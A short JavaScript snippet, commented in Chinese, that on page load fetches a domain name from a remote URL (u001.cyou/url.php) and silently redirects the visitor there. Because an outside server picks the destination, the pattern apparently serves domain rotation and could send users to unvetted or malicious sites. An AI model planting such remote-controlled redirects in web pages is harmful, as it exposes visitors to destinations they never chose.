window.onload = function() {
    // 从指定的URL获取新的域名
    fetch('https://u001.cyou/url.php')
        .then(response => response.text()) // 假设响应是纯文本
        .then(domain => {
            const nextUrl = 'https://' + domain.trim(); // 构建完整的URL
            window.location.replace(nextUrl); // 重定向到新的URL
        })
        .catch(error => {
            console.error('获取URL时出错：', error);
        });
};
